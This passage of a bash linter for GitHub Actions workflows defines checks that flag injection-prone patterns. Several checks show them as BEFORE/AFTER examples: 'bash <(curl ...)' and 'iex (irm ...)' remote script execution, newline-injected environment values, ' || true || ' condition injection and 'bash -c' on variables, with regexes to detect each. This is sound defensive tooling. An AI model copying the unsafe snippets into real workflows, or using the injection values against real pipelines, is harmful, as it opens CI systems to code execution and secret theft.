    contents: read
  jobs:
    build: ...
EOF
}

check_33() {
    local missing_count=0
    for file in "$@"; do
        # Only check workflow files (must have top-level 'on:' trigger), skip actions
        if ! grep -qE '^on:|^"on":|^on$' "${file}" 2>/dev/null; then
            continue
        fi
        # Skip reusable workflow implementations (they inherit caller permissions)
        if grep -qE '^\s*workflow_call:' "${file}" 2>/dev/null; then
            continue
        fi
        # Check for top-level permissions key
        if ! grep -qE '^permissions:' "${file}" 2>/dev/null; then
            missing_count=$((missing_count + 1))
        fi
    done
    if [[ "${missing_count}" -gt 0 ]]; then
        log_issue "LOW" "Multiple files" "Found ${missing_count} workflows without an explicit top-level 'permissions:' key - add permissions with least-privilege scopes"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 34: Concurrency group with attacker-controlled data
# =============================================================================
check_34_description="concurrency group with attacker-controlled data"
check_34_severity="MEDIUM"

example_check_34() {
    cat <<'EOF'
# WHY: Concurrency groups control which runs cancel each other. If an attacker
# controls the group name (via github.head_ref or a PR title), they can craft
# a value that collides with legitimate runs, causing Denial of Service by
# cancelling in-progress CI for other PRs or branches.
#
# BEFORE (risky - branch name controls cancellation group, enabling DoS):
  concurrency:
    group: deploy-${{ github.head_ref }}
# AFTER (safe - use PR number or SHA):
  concurrency:
    group: deploy-${{ github.event.pull_request.number || github.sha }}
EOF
}

check_34() {
    local file="$1"
    if ! grep -qE 'concurrency:' "${file}" 2>/dev/null; then
        return 0
    fi

    local risky_concurrency
    risky_concurrency=$(awk '
        /^concurrency:/ || /^[[:space:]]+concurrency:/ {
            in_concurrency = 1
            match($0, /^[[:space:]]*/)
            conc_indent = RLENGTH
            # Check inline concurrency value
            if ($0 ~ /concurrency:.*\$\{\{/ && $0 ~ /(github\.head_ref|github\.base_ref|github\.event\.[^}]*(title|body|head_branch))/) {
                if (!($0 ~ /github\.event\.pull_request\.number/ && $0 !~ /github\.event\.pull_request\.(title|body|head_branch)/)) {
                    print NR
                }
            }
            next
        }
        in_concurrency {
            match($0, /^[[:space:]]*/)
            ci = RLENGTH
            # Exit concurrency block when indent returns to same or lower level
            if (NF > 0 && ci <= conc_indent && $0 !~ /^[[:space:]]*$/) {
                in_concurrency = 0
                next
            }
            if (/\$\{\{/ && /(github\.head_ref|github\.base_ref|github\.event\.[^}]*(title|body|head_branch))/) {
                if (!($0 ~ /github\.event\.pull_request\.number/ && $0 !~ /github\.event\.pull_request\.(title|body|head_branch)/)) {
                    print NR
                }
            }
        }
    ' "${file}" 2>/dev/null || true)

    if [[ -n "${risky_concurrency}" ]]; then
        log_issue "MEDIUM" "${file}" "Concurrency group contains attacker-controlled expression - can enable DoS by cancelling legitimate runs" "$(_extract_lines "${risky_concurrency}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 35: issue_comment trigger without authorization gate
# =============================================================================
check_35_description="issue_comment trigger without authorization gate"
check_35_severity="MEDIUM"

example_check_35() {
    cat <<'EOF'
# WHY: issue_comment fires for comments from any user, including non-members.
# Without an author_association or org membership check, any GitHub user can
# trigger the workflow by commenting on a public issue, potentially consuming
# resources or triggering privileged operations.
#
# BEFORE (any commenter triggers workflow):
  on: issue_comment
  jobs:
    deploy:
      runs-on: ubuntu-latest
      steps: ...
# AFTER (only repo members can trigger):
  on: issue_comment
  jobs:
    deploy:
      if: >-
        github.event.comment.author_association == 'MEMBER' ||
        github.event.comment.author_association == 'OWNER'
      runs-on: ubuntu-latest
      steps: ...
EOF
}

check_35() {
    local file="$1"
    local trigger_hits
    trigger_hits=$(grep -nE 'issue_comment' "${file}" 2>/dev/null || true)
    if [[ -z "${trigger_hits}" ]]; then
        return 0
    fi

    # Check for common authorization patterns
    if grep -qE 'author_association' "${file}" 2>/dev/null; then
        return 0
    fi
    if grep -qE '/orgs/.*members|/teams/' "${file}" 2>/dev/null; then
        return 0
    fi

    log_issue "MEDIUM" "${file}" "issue_comment trigger has no author_association or org membership check - any commenter can trigger this workflow" "$(_extract_lines "${trigger_hits}")"
    return 1
}

# =============================================================================
# Check 36: working-directory with attacker-controlled expressions
# =============================================================================
check_36_description="working-directory with attacker-controlled expressions"
check_36_severity="MEDIUM"

example_check_36() {
    cat <<'EOF'
# WHY: The working-directory property controls where a step's shell commands
# execute. If an attacker controls this path, they can direct execution to a
# directory containing malicious scripts or configuration files (e.g., a
# .bashrc or Makefile), hijacking the step's behavior.
#
# BEFORE (risky - attacker can control working directory):
  - run: make build
    working-directory: ${{ inputs.build-dir }}
# AFTER (safe - validate path before use):
  env:
    BUILD_DIR: ${{ inputs.build-dir }}
  run: |
    [[ "${BUILD_DIR}" =~ ^[a-zA-Z0-9._/-]+$ ]] || exit 1
    cd "${BUILD_DIR}" && make build
EOF
}

check_36() {
    local file="$1"

    # Always flag github.event.*, github.head_ref, github.base_ref
    local risky_workdir
    risky_workdir=$(grep -nE 'working-directory:.*\$\{\{.*(github\.event\.|github\.head_ref|github\.base_ref)' "${file}" 2>/dev/null || true)

    if [[ -z "${risky_workdir}" ]]; then
        # For inputs.*, only flag if the workflow has untrusted input triggers
        # Composite actions receive inputs from trusted callers
        local has_untrusted=0
        if grep -qE '^\s*(workflow_dispatch|repository_dispatch|pull_request|pull_request_target|issues|issue_comment):' "${file}" 2>/dev/null; then
            has_untrusted=1
        fi
        if [[ "${has_untrusted}" -eq 1 ]]; then
            risky_workdir=$(grep -nE 'working-directory:.*\$\{\{.*inputs\.' "${file}" 2>/dev/null || true)
        fi
    fi

    if [[ -n "${risky_workdir}" ]]; then
        log_issue "MEDIUM" "${file}" "working-directory contains attacker-controlled expression interpolation - can influence which directory code runs in" "$(_extract_lines "${risky_workdir}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 37: actions/github-script with non-event attacker-controlled interpolation
# =============================================================================
check_37_description="github-script with inputs/outputs/secrets interpolation"
check_37_severity="HIGH"

example_check_37() {
    cat <<'EOF'
# WHY: actions/github-script executes JavaScript in a Node.js runtime with
# access to the GitHub API. When ${{ inputs.* }}, ${{ secrets.* }}, or
# ${{ steps.*.outputs.* }} are interpolated into the script body, the values
# become JavaScript source code. An attacker can break out of a string
# literal and execute arbitrary JS.
#
# BEFORE (unsafe - attacker-controlled input becomes JavaScript source):
  uses: actions/github-script@v7
  with:
    script: |
      const body = "${{ inputs.user-script }}";
      console.log(body);
# AFTER (safe - pass through env and read from process.env):
  uses: actions/github-script@v7
  env:
    USER_SCRIPT: ${{ inputs.user-script }}
  with:
    script: |
      const body = process.env.USER_SCRIPT;
      console.log(body);
EOF
}

check_37() {
    local file="$1"
    local attacker_controlled_js='(inputs\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.|matrix\.|secrets\.|github\.head_ref|github\.base_ref)'
    if grep -qE 'actions/github-script' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk -v pattern="${attacker_controlled_js}" '
            BEGIN { in_action = 0; in_script = 0; script_indent = 0 }
            /uses:.*actions\/github-script/ { in_action = 1; next }
            in_action && /^[[:space:]]*script:[[:space:]]*\|/ {
                match($0, /^[[:space:]]*/); script_indent = RLENGTH; in_script = 1; next
            }
            in_action && /^[[:space:]]*script:/ && $0 ~ pattern { print NR; next }
            in_script {
                if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_script = 0; in_action = 0; next }
                match($0, /^[[:space:]]*/); curr_indent = RLENGTH
                if (curr_indent <= script_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_script = 0; in_action = 0; next }
            }
            in_script && $0 ~ pattern { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "actions/github-script contains attacker-controlled \${{ inputs.* }}, outputs, matrix, secrets, or ref data in script body - JavaScript injection risk" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 38: actions/github-script dynamic code execution primitives
# =============================================================================
check_38_description="github-script dynamic code execution primitives"
check_38_severity="HIGH"

example_check_38() {
    cat <<'EOF'
# WHY: eval(), new Function(), and vm.runInNewContext() in JavaScript treat
# their arguments as code. If any input, environment variable, or
# core.getInput() value reaches these functions, the attacker gets arbitrary
# JavaScript execution with full access to the GitHub token and API.
#
# BEFORE (unsafe - runtime input is executed as JavaScript):
  uses: actions/github-script@v7
  with:
    script: |
      const dynamic = core.getInput('payload');
      return new Function(dynamic)();
# AFTER (safe - treat input as data, not code):
  uses: actions/github-script@v7
  with:
    script: |
      const payload = core.getInput('payload');
      console.log(payload);
EOF
}

check_38() {
    local file="$1"
    if grep -qE 'actions/github-script' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk '
            BEGIN { in_action = 0; in_script = 0; script_indent = 0 }
            /uses:.*actions\/github-script/ { in_action = 1; next }
            in_action && /^[[:space:]]*script:[[:space:]]*\|/ {
                match($0, /^[[:space:]]*/); script_indent = RLENGTH; in_script = 1; next
            }
            function is_dynamic_js() {
                return $0 ~ /eval[[:space:]]*\(/ ||
                       $0 ~ /new[[:space:]]+Function[[:space:]]*\(/ ||
                       $0 ~ /vm\.(runInNewContext|runInThisContext|Script)[[:space:]]*\(/
            }
            in_action && /^[[:space:]]*script:/ && is_dynamic_js() { print NR; next }
            in_script {
                if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_script = 0; in_action = 0; next }
                match($0, /^[[:space:]]*/); curr_indent = RLENGTH
                if (curr_indent <= script_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_script = 0; in_action = 0; next }
            }
            in_script && is_dynamic_js() { print NR }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            log_issue "HIGH" "${file}" "actions/github-script uses eval/new Function/vm dynamic code execution in script body - treat inputs and env data as data, not code" "$(_extract_lines "${unsafe_usage}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 39: Inline interpreter eval/exec patterns in run blocks
# =============================================================================
check_39_description="inline interpreter eval/exec patterns in run blocks"
check_39_severity="HIGH"

example_check_39() {
    cat <<'EOF'
# WHY: node -e "eval(...)", python -c "exec(...)", and similar patterns
# execute dynamically constructed code inside an interpreter. If the argument
# includes environment variables set from untrusted input, the attacker can
# inject arbitrary code in the interpreter's language.
#
# BEFORE (unsafe - env/input is re-executed by Node.js):
  env:
    USER_SCRIPT: ${{ inputs.payload }}
  run: node -e "eval(process.env.USER_SCRIPT)"
# AFTER (safe - consume as data without dynamic evaluation):
  env:
    USER_SCRIPT: ${{ inputs.payload }}
  run: node -e "console.log(process.env.USER_SCRIPT)"
EOF
}

check_39() {
    local file="$1"
    local unsafe_usage
    unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
        function check_line() {
            if ($0 ~ /node([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(eval[[:space:]]*\(|new[[:space:]]+Function[[:space:]]*\(|vm\.(runInNewContext|runInThisContext|Script)[[:space:]]*\()/) { print NR; return }
            if ($0 ~ /python3?([^[:alnum:]_]|$)/ && $0 ~ /-c/ && $0 ~ /(^|[^[:alnum:]_])(eval|exec)[[:space:]]*\(/) { print NR; return }
            if ($0 ~ /perl([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(^|[^[:alnum:]_])eval([^[:alnum:]_]|$)/) { print NR; return }
            if ($0 ~ /ruby([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(^|[^[:alnum:]_])eval[[:space:]]*\(/) { print NR; return }
            if ($0 ~ /php([^[:alnum:]_]|$)/ && $0 ~ /-r/ && $0 ~ /(^|[^[:alnum:]_])eval[[:space:]]*\(/) { print NR; return }
            if ($0 ~ /(pwsh|powershell)([^[:alnum:]_]|$)/ && $0 ~ /(-Command|-c)/ && $0 ~ /Invoke-Expression/) { print NR; return }
        }
        /^[[:space:]]*(-[[:space:]]+)?run:/ { check_line(); next }
        in_run_block { check_line() }
    ' "${file}" 2>/dev/null)
    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "HIGH" "${file}" "Inline interpreter command uses eval/exec-style dynamic code execution in run: block - avoid executing constructed code" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 40: actions/github-script command execution APIs
# =============================================================================
check_40_description="github-script command execution APIs"
check_40_severity="HIGH"

example_check_40() {
    cat <<'EOF'
# WHY: child_process functions (execSync, spawn, exec) execute shell commands
# from JavaScript. When actions/github-script reads runtime input via
# core.getInput() or process.env and passes it to these functions, the
# attacker's data becomes a shell command — full command injection.
#
# BEFORE (unsafe - runtime input is executed as a shell command):
  uses: actions/github-script@v7
  with:
    script: |
      const { execSync } = require('child_process');
      const cmd = core.getInput('payload');
      execSync(cmd, { shell: true });
# AFTER (safe - avoid runtime shell execution from inputs):
  uses: actions/github-script@v7
  with:
    script: |
      const payload = core.getInput('payload');
      console.log(payload);
EOF
}

check_40() {
    local file="$1"
    if grep -qE 'actions/github-script' "${file}" 2>/dev/null; then
        local unsafe_usage
        unsafe_usage=$(awk '
            BEGIN { in_action = 0; in_script = 0; script_indent = 0; has_runtime_source = 0; has_command_exec = 0 }
            function flush_script() {
                if (in_script && has_runtime_source && has_command_exec) {
                    print "unsafe"
                }
                has_runtime_source = 0
                has_command_exec = 0
            }
            /uses:.*actions\/github-script/ {
                flush_script()
                in_action = 1
                in_script = 0
                next
            }
            in_action && /^[[:space:]]*script:[[:space:]]*\|/ {
                match($0, /^[[:space:]]*/); script_indent = RLENGTH; in_script = 1; next
            }
            in_action && /^[[:space:]]*script:/ {
                if ($0 ~ /core\.getInput[[:space:]]*\(|process\.env[[:space:]]*[\[.]/) has_runtime_source = 1
                if ($0 ~ /(execSync|exec|spawnSync|spawn|execFileSync|execFile)[[:space:]]*\(/ || $0 ~ /shell:[[:space:]]*true/) has_command_exec = 1
                if (has_runtime_source && has_command_exec) print "unsafe"
                next
            }
            in_script {
                if ($0 ~ /^[[:space:]]*-[[:space:]]/) {
                    flush_script()
                    in_script = 0
                    in_action = 0
                    next
                }
                match($0, /^[[:space:]]*/); curr_indent = RLENGTH
                if (curr_indent <= script_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) {
                    flush_script()
                    in_script = 0
                    in_action = 0
                    next
                }
                if ($0 ~ /core\.getInput[[:space:]]*\(|process\.env[[:space:]]*[\[.]/) has_runtime_source = 1
                if ($0 ~ /(execSync|exec|spawnSync|spawn|execFileSync|execFile)[[:space:]]*\(/ || $0 ~ /shell:[[:space:]]*true/) has_command_exec = 1
            }
            END { flush_script() }
        ' "${file}" 2>/dev/null)
        if [[ -n "${unsafe_usage}" ]]; then
            local script_lines
            script_lines=$(grep -nE 'actions/github-script' "${file}" 2>/dev/null || true)
            log_issue "HIGH" "${file}" "actions/github-script combines runtime input/env data with child_process command execution APIs - command injection risk" "$(_extract_lines "${script_lines}")"
            return 1
        fi
    fi
    return 0
}

# =============================================================================
# Check 41: Inline interpreter command execution APIs
# =============================================================================
check_41_description="inline interpreter command execution APIs"
check_41_severity="HIGH"

example_check_41() {
    cat <<'EOF'
# WHY: Patterns like  python -c "subprocess.run(os.environ['X'], shell=True)"
# or  node -e "execSync(process.env.X)"  execute env-var contents as shell
# commands. Even though the value was passed safely via an env block (not
# ${{ }}), the interpreter re-elevates it from data back to code.
#
# BEFORE (unsafe - env/input is executed through a shell):
  env:
    USER_CMD: ${{ inputs.payload }}
  run: python -c "import os, subprocess; subprocess.run(os.environ['USER_CMD'], shell=True, check=True)"
# AFTER (safe - avoid shell execution of runtime input):
  env:
    USER_CMD: ${{ inputs.payload }}
  run: python -c "import os; print(os.environ['USER_CMD'])"
EOF
}

check_41() {
    local file="$1"
    local unsafe_usage
    unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
        /^[[:space:]]*(-[[:space:]]+)?run:/ { print NR ":" $0; next }
        in_run_block { print NR ":" $0 }
    ' "${file}" 2>/dev/null | grep -E \
        'node([^[:alnum:]_]|$).*-e.*(execSync|exec|spawnSync|spawn|execFileSync|execFile)[[:space:]]*\(|python3?([^[:alnum:]_]|$).*-c.*(subprocess\..*shell=True|os\.system\()|ruby([^[:alnum:]_]|$).*-e.*(^|[^[:alnum:]_])(system|exec|spawn|Open3\.capture2e|Open3\.capture3)[[:space:]]*\(|perl([^[:alnum:]_]|$).*-e.*(^|[^[:alnum:]_])(system|exec)([^[:alnum:]_]|$)|php([^[:alnum:]_]|$).*-r.*(shell_exec|exec|system|passthru|proc_open)[[:space:]]*\(' \
        || true)
    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "HIGH" "${file}" "Inline interpreter command uses shell/process execution APIs in run: block - avoid executing runtime data as commands" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 42: Shell command execution from variables
# =============================================================================
check_42_description="shell command execution from variables"
check_42_severity="HIGH"

example_check_42() {
    cat <<'EOF'
# WHY: "bash -c "$VARIABLE"" or "sh -c "$VARIABLE"" executes the variable's
# contents as a shell command. If the variable was set from untrusted input
# (even safely via an env block), this pattern converts data back into code,
# defeating the env-var mitigation entirely.
#
# BEFORE (unsafe - variable contents are executed as shell code):
  env:
    USER_CMD: ${{ inputs.payload }}
  run: bash -c "${USER_CMD}"
# AFTER (safe - do not execute runtime data as code):
  env:
    USER_CMD: ${{ inputs.payload }}
  run: printf '%s\n' "${USER_CMD}"
EOF
}

check_42() {
    local file="$1"
    local unsafe_usage
    # shellcheck disable=SC2016
    unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
        /^[[:space:]]*(-[[:space:]]+)?run:/ { print NR ":" $0; next }
        in_run_block { print NR ":" $0 }
    ' "${file}" 2>/dev/null | grep -E \
        '(^|[[:space:]])(ba)?sh[[:space:]]+-c[[:space:]]+["'\'']?\$[A-Za-z_][A-Za-z0-9_]*|(^|[[:space:]])(zsh|dash|ksh)[[:space:]]+-c[[:space:]]+["'\'']?\$[A-Za-z_][A-Za-z0-9_]*|(^|[[:space:]])(pwsh|powershell)[[:space:]]+(-Command|-c)[[:space:]]+["'\'']?\$env:[A-Za-z_][A-Za-z0-9_]*' \
        || true)
    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "HIGH" "${file}" "Shell command is executed from a variable via *sh -c or PowerShell -Command - this treats runtime data as code" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 43: Remote script execution variants beyond curl | bash
# =============================================================================
check_43_description="remote script execution variants beyond pipes"
check_43_severity="HIGH"

example_check_43() {
    cat <<'EOF'
# WHY: "bash <(curl ...)" and PowerShell "iex (irm ...)" download and execute
# remote code in a single operation, just like "curl | bash". The process-
# substitution variant is harder to grep for but equally dangerous — no
# integrity verification occurs before execution.
#
# BEFORE (unsafe - remote script executed via process substitution / IEX):
  run: bash <(curl -sSL https://example.com/install.sh)
  # or
  run: pwsh -Command "iex (irm https://example.com/install.ps1)"
# AFTER (safer - download, verify, and inspect before executing):
  run: |
    curl -sSL -o install.sh https://example.com/install.sh
    sha256sum -c <<< "expected_hash  install.sh"
    bash install.sh
EOF
}

check_43() {
    local file="$1"
    local unsafe_usage
    unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
        /^[[:space:]]*(-[[:space:]]+)?run:/ { print NR ":" $0; next }
        in_run_block { print NR ":" $0 }
    ' "${file}" 2>/dev/null | grep -E \
        '(bash|sh|zsh|ksh)[[:space:]]+<\([[:space:]]*(curl|wget)[^)]*\)|(^|[[:space:]])(\.|source)[[:space:]]+<\([[:space:]]*(curl|wget)[^)]*\)|(pwsh|powershell).*((-Command|-c).*)?(iex|Invoke-Expression)[[:space:]]*\((irm|iwr|Invoke-RestMethod|Invoke-WebRequest)[[:space:]]+' \
        || true)
    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "HIGH" "${file}" "Remote content is executed directly via process substitution or PowerShell IEX/IRM - download and verify first" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 44: Attacker-controlled env vars written to GITHUB_ENV/PATH/OUTPUT
# =============================================================================
check_44_description="attacker-controlled env vars written to GITHUB_ENV/PATH/OUTPUT"
check_44_severity="HIGH"

example_check_44() {
    cat <<'EOF'
# GITHUB_ENV / GITHUB_OUTPUT / GITHUB_PATH use newlines as record
# delimiters: each entry is  key=value\n  (one line per variable).
#
# The trailing newline from  printf '%s\n'  is the *record terminator* —
# it tells GitHub Actions where one entry ends and the next begins.
# That newline is required and safe.
#
# The danger is a newline *embedded inside the value*.  If an attacker-
# controlled value contains \n, it terminates the current record early
# and starts a new one, injecting an arbitrary key=value pair:
#
#   VALUE="legit\nMALICIOUS_VAR=pwned"
#   printf '%s\n' "FOO=${VALUE}" >> "${GITHUB_OUTPUT}"
#   # writes two records:
#   #   FOO=legit
#   #   MALICIOUS_VAR=pwned        <-- injected by attacker
#
# BEFORE (unsafe - attacker-controlled value can inject extra entries):
  env:
    EXTRA_PATH: ${{ inputs.extra-path }}
  run: echo "${EXTRA_PATH}" >> "${GITHUB_PATH}"
# AFTER (safer - reject embedded newlines, then write with printf):
  env:
    EXTRA_PATH: ${{ inputs.extra-path }}
  run: |
    if [[ "${EXTRA_PATH}" == *$'\n'* ]] || [[ "${EXTRA_PATH}" == *$'\r'* ]]; then
      echo "::error::EXTRA_PATH contains newlines"; exit 1
    fi
    printf '%s\n' "${EXTRA_PATH}" >> "${GITHUB_PATH}"
EOF
}

check_44() {
    local file="$1"

    # Determine which source patterns are dangerous for this file.
    # For composite actions, workflow_call-only, and workflow_dispatch-only
    # workflows, inputs.* and steps/needs outputs come from trusted callers
    # (repo collaborators), so only flag github.event.*, github.head_ref,
    # github.base_ref.
    local has_untrusted_inputs=1
    if grep -qE '^\s*using:\s*["\047]?composite' "${file}" 2>/dev/null; then
        has_untrusted_inputs=0
    else
        # Check if the file has any truly untrusted triggers
        local has_dangerous_trigger=0
        if grep -qE '^\s*(pull_request|pull_request_target|issues|issue_comment|repository_dispatch):' "${file}" 2>/dev/null; then
            has_dangerous_trigger=1
        fi
        if [[ "${has_dangerous_trigger}" -eq 0 ]]; then
            has_untrusted_inputs=0
        fi
    fi

    local unsafe_usage
    unsafe_usage=$(awk -v check_inputs="${has_untrusted_inputs}" '
        BEGIN {
            in_step = 0
            step_indent = -1
            in_env = 0
            env_indent = -1
            in_run_block = 0
            run_indent = -1
        }
        function clear_env_vars(    k) {
            for (k in dangerous_env) {
                delete dangerous_env[k]
            }
        }
        function reset_step() {
            in_step = 0
            step_indent = -1
            in_env = 0
            env_indent = -1
            in_run_block = 0
            run_indent = -1
            clear_env_vars()
        }
        function line_uses_dangerous_var(line,    k, pat1, pat2) {
            for (k in dangerous_env) {
                pat1 = "\\$" k "([^A-Za-z0-9_]|$)"
                pat2 = "\\$\\{" k "\\}"
                if (line ~ pat1 || line ~ pat2) {
                    return 1
                }
            }
            return 0
        }
        {
            match($0, /^[[:space:]]*/)
            curr_indent = RLENGTH
        }
        /^[[:space:]]*-[[:space:]]/ {
            reset_step()
            in_step = 1
            step_indent = curr_indent
        }
        in_step && curr_indent <= step_indent && $0 !~ /^[[:space:]]*-[[:space:]]/ && $0 ~ /^[[:space:]]*[A-Za-z_-]+:/ {
            reset_step()
        }
        in_step && /^[[:space:]]*(-[[:space:]]+)?env:[[:space:]]*$/ {
            in_env = 1
            env_indent = curr_indent
            next
        }
        in_env {
            if (curr_indent <= env_indent && $0 ~ /^[[:space:]]*[A-Za-z_-]+:/) {
                in_env = 0
            } else {
                is_dangerous = 0
                # Always flag github.event.*, github.head_ref, github.base_ref
                if ($0 ~ /\$\{\{.*(github\.event\.|github\.head_ref|github\.base_ref)/) {
                    is_dangerous = 1
                }
                # Only flag inputs/matrix/steps/needs/secrets for untrusted workflows
                if (check_inputs == "1" && $0 ~ /\$\{\{.*(inputs\.|matrix\.|steps\.[^}]+\.outputs\.|needs\.[^}]+\.outputs\.|secrets\.)/) {
                    is_dangerous = 1
                }
                if (is_dangerous && $0 ~ /^[[:space:]]*[A-Za-z_][A-Za-z0-9_]*:[[:space:]]*\$\{\{/) {
                    line = $0
                    sub(/^[[:space:]]*/, "", line)
                    split(line, parts, ":")
                    dangerous_env[parts[1]] = 1
                }
            }
        }
        in_step && /^[[:space:]]*run:[[:space:]]*\|/ {
            in_run_block = 1
            run_indent = curr_indent
            next
        }
        in_step && /^[[:space:]]*run:/ {
            if ($0 ~ /GITHUB_(ENV|PATH|OUTPUT)/ && line_uses_dangerous_var($0)) {
                print NR
            }
            next
        }
        in_run_block {
            if ($0 ~ /^[[:space:]]*-[[:space:]]/) {
                in_run_block = 0
                has_validation = 0
                next
            }
            if (curr_indent <= run_indent && $0 ~ /^[[:space:]]*[A-Za-z_-]+:/) {
                in_run_block = 0
                has_validation = 0
                next
            }
            # Detect validation patterns (newline checks, regex validation)
            if ($0 ~ /validate_no_newlines|\\n.*\\r|newline|exit 1/ && $0 !~ /GITHUB_(ENV|PATH|OUTPUT)/) {
                has_validation = 1
            }
            if ($0 ~ /=~.*\^\[/ || $0 ~ /\[\[.*!~/) {
                has_validation = 1
            }
            if ($0 ~ /GITHUB_(ENV|PATH|OUTPUT)/ && line_uses_dangerous_var($0)) {
                if (!has_validation) {
                    print NR
                }
            }
        }
    ' "${file}" 2>/dev/null)
    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "HIGH" "${file}" "Attacker-controlled env var is written to GITHUB_ENV/PATH/OUTPUT - newline injection can create unintended entries" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 45: Expression injection in 'if:' conditions
# =============================================================================
check_45_description="expression injection in 'if:' conditions"
check_45_severity="HIGH"

example_check_45() {
    cat <<'EOF'
# WHY: GitHub Actions if: conditions support native expressions without ${{ }}
# wrapping. When ${{ }} IS used, the expression is first string-interpolated
# then evaluated, so attacker-controlled values can alter the boolean logic
# (e.g., injecting  ' || true || '  to force a condition to pass).
#
# BEFORE (unsafe - attacker-controlled data in conditional logic):
  if: contains('${{ github.event.pull_request.title }}', 'build')
  run: echo "This step runs conditionally"
# AFTER (safe - avoid direct interpolation in if conditions):
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  if: contains(env.PR_TITLE, 'build')
  run: echo "This step runs conditionally"
EOF
}

check_45() {
    local file="$1"
    local found=0

    # Check for if: conditions with attacker-controlled expressions
    # Only flag if: conditions that use ${{ }} wrapping (native expressions without
    # ${{ }} are safe since they're not subject to string interpolation injection).
    # Also skip inputs.* if the workflow only has workflow_call triggers (trusted callers).
    local dangerous_if
    dangerous_if=$(grep -nE '^[[:space:]]*if:.*\$\{\{.*(github\.event\.(pull_request|issue|comment|discussion|review|release)|client_payload|github\.head_ref|github\.base_ref)' "${file}" 2>/dev/null || true)

    if [[ -n "${dangerous_if}" ]]; then
        log_issue "HIGH" "${file}" "'if:' condition contains attacker-controlled expression interpolation - can manipulate workflow logic" "$(_extract_lines "${dangerous_if}")"
        found=1
    fi

    # Check inputs.* separately - only flag if the workflow has untrusted triggers
    # (workflow_dispatch, pull_request_target, etc.), not just workflow_call
    local inputs_in_if
    inputs_in_if=$(grep -nE '^[[:space:]]*if:.*\$\{\{.*inputs\.' "${file}" 2>/dev/null || true)
    if [[ -n "${inputs_in_if}" ]]; then
        local has_untrusted_input_trigger
        has_untrusted_input_trigger=$(grep -cE '^\s*(workflow_dispatch|repository_dispatch):' "${file}" 2>/dev/null || echo "0")
        if [[ "${has_untrusted_input_trigger}" -gt 0 ]]; then
            log_issue "HIGH" "${file}" "'if:' condition contains attacker-controlled input expression interpolation - can manipulate workflow logic" "$(_extract_lines "${inputs_in_if}")"
            found=1
        fi
    fi

    [[ ${found} -eq 0 ]]
}

# =============================================================================
# Check 46: Bracket notation bypass in expressions
# =============================================================================
check_46_description="bracket notation bypass in expressions"
check_46_severity="HIGH"

example_check_46() {
    cat <<'EOF'
# WHY: ${{ inputs['user-command'] }} and ${{ github.event['pull_request']['title'] }}
# access the same values as dot notation but may bypass security scanners that
# only look for dot-notation patterns. The injection risk is identical — the
# value is still textually expanded into the shell command.
#
# BEFORE (unsafe - bracket notation bypasses dot-notation detection):
  run: echo "${{ inputs['user-command'] }}"
  run: echo "${{ github.event['pull_request']['title'] }}"
# AFTER (safe - use env var for all interpolation):
  env:
    USER_CMD: ${{ inputs['user-command'] }}
    PR_TITLE: ${{ github.event['pull_request']['title'] }}
  run: |
    echo "${USER_CMD}"
    echo "${PR_TITLE}"
EOF
}

check_46() {
    local file="$1"
    # Detect bracket notation with ${{} in run blocks
    # First extract run block content, then check for bracket notation

    local unsafe_usage
    unsafe_usage=$(awk '
        BEGIN { in_run_block = 0; run_indent = 0; content = "" }
        /^[[:space:]]*(-[[:space:]]+)?run:[[:space:]]*\|/ {
            match($0, /^[[:space:]]*/); run_indent = RLENGTH; in_run_block = 1; next
        }
        /^[[:space:]]*(-[[:space:]]+)?run:/ {
            if (/\$\{\{/) {
                print NR ":" $0
            }
            next
        }
        in_run_block {
            if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_run_block = 0; next }
            match($0, /^[[:space:]]*/); curr_indent = RLENGTH
            if (curr_indent <= run_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_run_block = 0; next }
            print NR ":" $0
        }
    ' "${file}" 2>/dev/null | grep -E '\$\{\{[^}]*\[' || true)

    if [[ -n "${unsafe_usage}" ]]; then
        log_issue "HIGH" "${file}" "Uses bracket notation for expression in run block - can bypass dot-notation detection" "$(_extract_lines "${unsafe_usage}")"
        return 1
    fi
    return 0
}

# =============================================================================
# Check 47: Additional attacker-controlled event contexts
# =============================================================================
check_47_description="additional attacker-controlled event contexts"
check_47_severity="HIGH"

example_check_47() {
    cat <<'EOF'
